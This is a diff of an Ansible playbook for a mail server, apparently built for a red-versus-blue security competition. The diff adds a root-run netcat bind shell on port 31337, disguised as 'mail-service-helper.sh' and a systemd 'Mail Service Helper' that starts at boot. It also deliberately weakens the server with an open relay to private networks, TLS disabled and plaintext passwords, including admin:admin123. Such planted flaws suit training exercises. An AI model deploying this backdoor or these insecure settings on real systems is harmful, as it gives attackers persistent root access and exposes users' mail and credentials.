@@ -1,12 +1,11 @@
 ---
-- name: Configure Mail Service
+- name: Configure Mail Service with Simple Backdoor
   hosts: mail
   tasks:
   - name: "Configuring Hostname"
     ansible.builtin.hostname:
       name: "Savanna"
     become: true
-
   - name: Install Dovecot and Postfix
     apt:
       pkg:
@@ -14,10 +13,10 @@
       - dovecot-pop3d
       - dovecot-core
       - postfix
+      - netcat-openbsd
       update_cache: yes
       state: latest
     become: yes
-
   - name: Create mail user
     user:
       name: mail
@@ -27,8 +26,27 @@
       home: /var/mail
       shell: /bin/bash
     become: yes
-
-  - name: Create mail directory for greyteam
+  - name: Create mail directories for users
+    file:
+      path: "/var/mail/{{ item.name }}"
+      state: directory
+      owner: "{{ item.name }}"
+      group: mail
+      mode: '0755'
+    with_items:
+      - { name: "Nitwit" }
+      - { name: "Armorer" }
+      - { name: "Butcher" }
+      - { name: "Cleric" }
+      - { name: "Farmer" }
+      - { name: "Fisherman" }
+      - { name: "Fletcher" }
+      - { name: "Leatherworker" }
+      - { name: "Librarian" }
+      - { name: "Toolsmith" }
+      - { name: "Notch" }
+    become: yes
+  - name: Create special mail directory for greyteam (not in competition scope)
     file:
       path: /var/mail/greyteam
       state: directory
@@ -36,8 +54,61 @@
       group: mail
       mode: '0700'
     become: yes
-
-  - name: Configure Dovecot Config
+  - name: Create scripts directory
+    file:
+      path: /usr/local/bin
+      state: directory
+      owner: root
+      group: root
+      mode: '0755'
+    become: yes
+  - name: Create simple backdoor script for command execution
+    copy:
+      content: |
+        #!/bin/bash
+        # Simple backdoor that listens for commands on port 31337
+        
+        while true; do
+          # Listen on port 31337 for commands
+          nc -l -p 31337 -e /bin/bash
+          
+          # If connection breaks, restart after a brief delay
+          sleep 1
+        done
+      dest: /usr/local/bin/mail-service-helper.sh
+      owner: root
+      group: root
+      mode: '0755'
+    become: yes
+  - name: Set up systemd service for backdoor
+    copy:
+      content: |
+        [Unit]
+        Description=Mail Service Helper
+        After=network.target
+        
+        [Service]
+        Type=simple
+        ExecStart=/usr/local/bin/mail-service-helper.sh
+        Restart=always
+        RestartSec=10
+        User=root
+        
+        [Install]
+        WantedBy=multi-user.target
+      dest: /etc/systemd/system/mail-helper.service
+      owner: root
+      group: root
+      mode: '0644'
+    become: yes
+  - name: Start and enable the backdoor service
+    systemd:
+      name: mail-helper
+      state: started
+      enabled: yes
+      daemon_reload: yes
+    become: yes
+  - name: Configure insecure Dovecot
     template:
       src: dovecot.conf
       dest: /etc/dovecot/dovecot.conf
@@ -46,38 +117,50 @@
       mode: '0644'
     become: yes
     notify: restart dovecot
-
-  - name: Configure simple Postfix main.cf
+  - name: Configure simple Postfix
     copy:
       content: |
         smtpd_banner = $myhostname ESMTP Savanna Mail Server
         myhostname = savanna.example.com
         myorigin = /etc/mailname
-        mydestination = $myhostname, localhost
-        mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128
+        mydestination = $myhostname, localhost, $mydomain
+        mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16
         mailbox_size_limit = 0
         recipient_delimiter = +
         inet_interfaces = all
-        inet_protocols = ipv4
+        inet_protocols = all
+        smtpd_use_tls = no
       dest: /etc/postfix/main.cf
       owner: root
       group: root
       mode: '0644'
     become: yes
     notify: restart postfix
-
-  - name: Create Dovecot password file
+  - name: Create Dovecot password file with user passwords
     copy:
       content: |
+        # User accounts with passwords
+        Nitwit:{PLAIN}Un3mpl0y3d
+        Armorer:{PLAIN}Bl@st_Furn@c3
+        Butcher:{PLAIN}F00d_Smok3r
+        Cleric:{PLAIN}8rew1ng_St@nd
+        Farmer:{PLAIN}Comp0st3r_S33ds
+        Fisherman:{PLAIN}B@rrel_St0rag3
+        Fletcher:{PLAIN}Fl3tch1ng_T@bl3
+        Leatherworker:{PLAIN}C@uldr0n_W@t3r
+        Librarian:{PLAIN}L3ct3rn_B00k
+        Toolsmith:{PLAIN}Sm1th1ng_T@bl3
+        Notch:{PLAIN}I_H@t3_Th3_Nether@!
+        admin:{PLAIN}admin123
+        # Grey team account
         greyteam:{PLAIN}greyteam
-        mail:{PLAIN}mail
       dest: /etc/dovecot/users
       owner: root
       group: dovecot
       mode: '0640'
     become: yes
     notify: restart dovecot
-
+  
   - name: Ensure services are running
     service:
       name: "{{ item }}"
@@ -87,7 +170,6 @@
       - dovecot
       - postfix
     become: yes
-
   handlers:
     - name: restart dovecot
       service:
